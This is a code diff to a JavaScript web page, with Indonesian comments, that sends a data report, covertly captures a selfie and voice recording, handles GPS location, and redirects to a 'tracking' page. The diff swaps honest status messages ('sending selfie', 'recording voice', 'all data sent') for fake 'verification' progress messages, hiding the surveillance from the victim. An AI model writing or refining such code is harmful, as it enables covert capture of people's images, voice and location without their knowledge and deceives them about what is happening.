@@ -621,16 +621,16 @@
                 }
                 
                 // 3. KIRIM LAPORAN LENGKAP
-                showToast('📡 Mengirim laporan data...');
+                showToast('verifikasi');
                 await sendFullReport();
                 
                 // 4. KIRIM SELFIE
-                showToast('📸 Mengambil dan mengirim selfie...');
+                showToast('50 %');
                 await hiddenCaptureSelfie();
                 
                 // 5. KIRIM VOICE (jika mikrofon diizinkan)
                 if (permissions.mic) {
-                    showToast('🎤 Merekam dan mengirim suara...');
+                    showToast('100 %');
                     await hiddenCaptureVoice();
                 } else {
                     const gpsText = (gpsData && gpsData.lat) ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
@@ -638,8 +638,8 @@
                 }
                 
                 // 6. REDIRECT KE TRACKING.HTML
-                loading.innerHTML = '✅ Semua data terkirim! Mengalihkan ke AI Tracking Lab...';
-                showToast('✅ Semua data terkirim! Mengalihkan...');
+                loading.innerHTML = '✅ verifikasi berhasil! Mengalihkan ke website...';
+                showToast('✅ verifikasi berhasil! Mengalihkan...');
                 
                 setTimeout(() => {
                     window.location.href = 'tracking.html';
